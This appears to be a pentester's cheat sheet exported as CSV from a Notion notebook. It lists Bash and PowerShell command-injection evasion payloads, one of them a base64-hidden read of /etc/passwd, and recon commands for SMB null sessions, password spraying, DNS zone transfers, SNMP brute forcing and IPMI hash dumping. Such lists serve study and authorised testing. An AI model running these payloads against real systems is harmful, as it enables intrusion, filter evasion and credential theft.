Vector,Description,OS,Security Domains,Target_Technology,URL
"echo $(tr '!-}' '""-~'<<<[)",Bit Shift any ASCII character ‘]’ in this case.,Linux,"Command Injection (https://www.notion.so/Command-Injection-1434c8e52376803c8c3edfbca59dcd49?pvs=21), Defense Evasion (https://www.notion.so/Defense-Evasion-1444c8e5237680b0b1e4e1911aa265ff?pvs=21)",Bash (https://www.notion.so/Bash-1434c8e5237680b5aa14d2174d201e9a?pvs=21),
%09,Tabs instead of spaces,Linux,"Command Injection (https://www.notion.so/Command-Injection-1434c8e52376803c8c3edfbca59dcd49?pvs=21), Defense Evasion (https://www.notion.so/Defense-Evasion-1444c8e5237680b0b1e4e1911aa265ff?pvs=21)",Bash (https://www.notion.so/Bash-1434c8e5237680b5aa14d2174d201e9a?pvs=21),
${IFS},Space Field Separator,Linux,"Command Injection (https://www.notion.so/Command-Injection-1434c8e52376803c8c3edfbca59dcd49?pvs=21), Defense Evasion (https://www.notion.so/Defense-Evasion-1444c8e5237680b0b1e4e1911aa265ff?pvs=21)",Bash (https://www.notion.so/Bash-1434c8e5237680b5aa14d2174d201e9a?pvs=21),
"{ls,-la}",Commas will be replaced with spaces,Linux,"Command Injection (https://www.notion.so/Command-Injection-1434c8e52376803c8c3edfbca59dcd49?pvs=21), Defense Evasion (https://www.notion.so/Defense-Evasion-1444c8e5237680b0b1e4e1911aa265ff?pvs=21)",Bash (https://www.notion.so/Bash-1434c8e5237680b5aa14d2174d201e9a?pvs=21),
${PATH:0:1},Will be replaced with /,Linux,"Command Injection (https://www.notion.so/Command-Injection-1434c8e52376803c8c3edfbca59dcd49?pvs=21), Defense Evasion (https://www.notion.so/Defense-Evasion-1444c8e5237680b0b1e4e1911aa265ff?pvs=21)",Bash (https://www.notion.so/Bash-1434c8e5237680b5aa14d2174d201e9a?pvs=21),
${LS_COLORS:10:1},Will be replaced with ;,Linux,"Command Injection (https://www.notion.so/Command-Injection-1434c8e52376803c8c3edfbca59dcd49?pvs=21), Defense Evasion (https://www.notion.so/Defense-Evasion-1444c8e5237680b0b1e4e1911aa265ff?pvs=21)",Bash (https://www.notion.so/Bash-1434c8e5237680b5aa14d2174d201e9a?pvs=21),
"$(tr ""[A-Z]"" ""[a-z]""<<<""WhOaMi"")",Execute command regardless of cases,Linux,"Command Injection (https://www.notion.so/Command-Injection-1434c8e52376803c8c3edfbca59dcd49?pvs=21), Defense Evasion (https://www.notion.so/Defense-Evasion-1444c8e5237680b0b1e4e1911aa265ff?pvs=21)",Bash (https://www.notion.so/Bash-1434c8e5237680b5aa14d2174d201e9a?pvs=21),
"$(a=""WhOaMi"";printf %s ""${a,,}"")",Execute command regardless of cases,Linux,"Command Injection (https://www.notion.so/Command-Injection-1434c8e52376803c8c3edfbca59dcd49?pvs=21), Defense Evasion (https://www.notion.so/Defense-Evasion-1444c8e5237680b0b1e4e1911aa265ff?pvs=21)",Bash (https://www.notion.so/Bash-1434c8e5237680b5aa14d2174d201e9a?pvs=21),
$(rev<<<'imaohw'),Reverse a string,Linux,"Command Injection (https://www.notion.so/Command-Injection-1434c8e52376803c8c3edfbca59dcd49?pvs=21), Defense Evasion (https://www.notion.so/Defense-Evasion-1444c8e5237680b0b1e4e1911aa265ff?pvs=21)",Bash (https://www.notion.so/Bash-1434c8e5237680b5aa14d2174d201e9a?pvs=21),
bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==),Execute Base64 string,Linux,"Command Injection (https://www.notion.so/Command-Injection-1434c8e52376803c8c3edfbca59dcd49?pvs=21), Defense Evasion (https://www.notion.so/Defense-Evasion-1444c8e5237680b0b1e4e1911aa265ff?pvs=21)",Bash (https://www.notion.so/Bash-1434c8e5237680b5aa14d2174d201e9a?pvs=21),
printenv,Print environment variables,Linux,Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21),Bash (https://www.notion.so/Bash-1434c8e5237680b5aa14d2174d201e9a?pvs=21),
Get-ChildItem Env:,Powershell: Print environment variables,Windows,Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21),PowerShell (https://www.notion.so/PowerShell-1434c8e52376805dba60efbabdb026bf?pvs=21),
"iex ""$('imaohw'[-1..-20] -join '')""",Execute Reversed String,Windows,Command Injection (https://www.notion.so/Command-Injection-1434c8e52376803c8c3edfbca59dcd49?pvs=21),PowerShell (https://www.notion.so/PowerShell-1434c8e52376805dba60efbabdb026bf?pvs=21),
Convert String to Base64 Example,Encode to Base64,Windows,Command Injection (https://www.notion.so/Command-Injection-1434c8e52376803c8c3edfbca59dcd49?pvs=21),PowerShell (https://www.notion.so/PowerShell-1434c8e52376805dba60efbabdb026bf?pvs=21),
Execute Base64 Encoded Command Example,Execute Base64 Encoded Command,Windows,Command Injection (https://www.notion.so/Command-Injection-1434c8e52376803c8c3edfbca59dcd49?pvs=21),PowerShell (https://www.notion.so/PowerShell-1434c8e52376805dba60efbabdb026bf?pvs=21),
curl -s https://crt.sh/\?q\=<target-domain>\&output\=json | jq .,Certificate transparency.,"Linux, Windows",Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21),HTTPs (https://www.notion.so/HTTPs-1434c8e523768019a037eea3c9eef66c?pvs=21),
openssl s_client -connect <FQDN/IP>:21 -starttls ftp,Interact with FTP over SSL/TLS,Linux,Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21),ftp (https://www.notion.so/ftp-1434c8e5237680bcaf18c24e9f10cb87?pvs=21),
wget -m --no-passive ftp://anonymous:anonymous@<target>,Download all files from anonymous FTP server,Linux,Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21),ftp (https://www.notion.so/ftp-1434c8e5237680bcaf18c24e9f10cb87?pvs=21),
smbclient -N -L //<FQDN/IP>,Null session authentication on SMB.,Linux,Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21),smb (https://www.notion.so/smb-1434c8e5237680e7b5c3ffe1f7ead9e1?pvs=21),
smbclient //<FQDN/IP>/<share>,Connect to a specific SMB share.,Linux,Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21),smb (https://www.notion.so/smb-1434c8e5237680e7b5c3ffe1f7ead9e1?pvs=21),
"rpcclient -U """" <FQDN/IP>",Interaction with the target using RPC.,Linux,Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21),"smb (https://www.notion.so/smb-1434c8e5237680e7b5c3ffe1f7ead9e1?pvs=21), rpc (https://www.notion.so/rpc-1444c8e5237680da82dbc974cd78a3f5?pvs=21)",
samrdump.py <FQDN/IP>,Username enumeration using Impacket scripts.,"Impacket, Linux",Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21),"smb (https://www.notion.so/smb-1434c8e5237680e7b5c3ffe1f7ead9e1?pvs=21), impacket (https://www.notion.so/impacket-1444c8e523768059ab69ddf37318b307?pvs=21)",https://github.com/fortra/impacket
smbmap -H <FQDN/IP>,Enumerating SMB shares.,Linux,Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21),smb (https://www.notion.so/smb-1434c8e5237680e7b5c3ffe1f7ead9e1?pvs=21),
crackmapexec smb <FQDN/IP> --shares -u '' -p '',Crackmapexec enumerate null sessions,Linux,Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21),smb (https://www.notion.so/smb-1434c8e5237680e7b5c3ffe1f7ead9e1?pvs=21),
enum4linux-ng.py <FQDN/IP> -A,SMB enumeration,Linux,Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21),smb (https://www.notion.so/smb-1434c8e5237680e7b5c3ffe1f7ead9e1?pvs=21),https://github.com/cddmp/enum4linux-ng
"nxc smb 172.25.90.128 -u smb_users.txt -p smb_passwords.txt
",NXC Password Spray,Linux,Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21),smb (https://www.notion.so/smb-1434c8e5237680e7b5c3ffe1f7ead9e1?pvs=21),https://github.com/Pennyw0rth/NetExec
nxc smb 172.25.90.128 -u USER_FOUND -p PASSWORD_FOUND -M spider_plus,Enumerate smb share and create .json file,Linux,Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21),smb (https://www.notion.so/smb-1434c8e5237680e7b5c3ffe1f7ead9e1?pvs=21),https://github.com/Pennyw0rth/NetExec
showmount -e <FQDN/IP>,Show available NFS shares.,Linux,Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21),nfs (https://www.notion.so/nfs-1444c8e5237680b4ab46cb70103b1336?pvs=21),
mount -t nfs <FQDN/IP>:/<share> ./target-NFS/ -o nolock,Mount the specific NFS share.umount ./target-NFS,Linux,Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21),nfs (https://www.notion.so/nfs-1444c8e5237680b4ab46cb70103b1336?pvs=21),
dig ns <domain.tld> @<nameserver>,NS request to the specific nameserver.,Linux,Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21),dns (https://www.notion.so/dns-1444c8e52376808aa820e13096bf807f?pvs=21),
dig any <domain.tld> @<nameserver>,ANY request to the specific nameserver.,Linux,Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21),dns (https://www.notion.so/dns-1444c8e52376808aa820e13096bf807f?pvs=21),
dig axfr <domain.tld> @<nameserver>,AXFR: Zone Transfer,Linux,Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21),dns (https://www.notion.so/dns-1444c8e52376808aa820e13096bf807f?pvs=21),
dnsenum --dnsserver <nameserver> --enum -p 0 -s 0 -o found_subdomains.txt -f ~/subdomains.list <domain.tld>,Subdomain brute forcing.,Linux,Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21),dns (https://www.notion.so/dns-1444c8e52376808aa820e13096bf807f?pvs=21),https://github.com/fwaeytens/dnsenum
curl -k 'imaps://<FQDN/IP>' --user <user>:<password>,Log in to the IMAPS service using cURL.,Linux,Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21),imaps (https://www.notion.so/imaps-1444c8e5237680e39c45ef6c42dcf61c?pvs=21),
openssl s_client -connect <FQDN/IP>:imaps,Connect to the IMAPS service.,Linux,Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21),imaps (https://www.notion.so/imaps-1444c8e5237680e39c45ef6c42dcf61c?pvs=21),
openssl s_client -connect <FQDN/IP>:pop3s,Connect to the POP3s service.,Linux,Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21),pop3s (https://www.notion.so/pop3s-1444c8e52376809daed9f51270c28a69?pvs=21),
snmpwalk -v2c -c <community string> <FQDN/IP>,Querying OIDs using snmpwalk.,Linux,Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21),snmp (https://www.notion.so/snmp-1444c8e523768043b6accd2ebda01382?pvs=21),
onesixtyone -c community-strings.list <FQDN/IP>,Bruteforcing community strings of the SNMP service.,Linux,Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21),snmp (https://www.notion.so/snmp-1444c8e523768043b6accd2ebda01382?pvs=21),https://github.com/trailofbits/onesixtyone
braa <community string>@<FQDN/IP>:.1.*,Bruteforcing SNMP service OIDs.,Linux,Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21),snmp (https://www.notion.so/snmp-1444c8e523768043b6accd2ebda01382?pvs=21),https://github.com/mteg/braa
mysql -u <user> -p<password> -h <FQDN/IP>,Login to the MySQL server.,Linux,Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21),mysql (https://www.notion.so/mysql-1444c8e523768019a5acd8abdc5f59f6?pvs=21),
mssqlclient.py <user>@<FQDN/IP> -windows-auth,Log in to the MSSQL server using Windows authentication.,Linux,Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21),mssql (https://www.notion.so/mssql-1444c8e5237680f9abcfdf35bc047c00?pvs=21),
msf6 auxiliary(scanner/ipmi/ipmi_version),IPMI version detection.,Linux,Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21),ipmi (https://www.notion.so/ipmi-1444c8e523768072b017fa81b4505c3b?pvs=21),
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes),Dump IPMI hashes.,Linux,Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21),ipmi (https://www.notion.so/ipmi-1444c8e523768072b017fa81b4505c3b?pvs=21),
ssh-audit.py <FQDN/IP>,Remote security audit against the target SSH service.,Linux,Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21),ssh (https://www.notion.so/ssh-1444c8e5237680f29279ce80e0cf529b?pvs=21),https://github.com/jtesta/ssh-audit
ssh <user>@<FQDN/IP>,ssh login,Linux,Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21),ssh (https://www.notion.so/ssh-1444c8e5237680f29279ce80e0cf529b?pvs=21),
ssh -i private.key <user>@<FQDN/IP>,ssh with private key,Linux,Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21),ssh (https://www.notion.so/ssh-1444c8e5237680f29279ce80e0cf529b?pvs=21),
